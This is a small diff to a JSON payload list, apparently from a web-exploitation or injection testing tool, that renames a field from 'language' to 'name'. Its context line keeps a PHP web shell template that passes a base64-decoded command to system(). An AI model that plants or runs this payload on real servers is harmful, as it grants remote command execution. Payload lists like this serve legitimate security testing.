@@ -1,6 +1,6 @@
 {
 	"payloads": [{
-			"language": "php",
+			"name": "php_1",
 			"payload": "<? echo system(base64_decode('{command}')); ?>"
 		}]
 
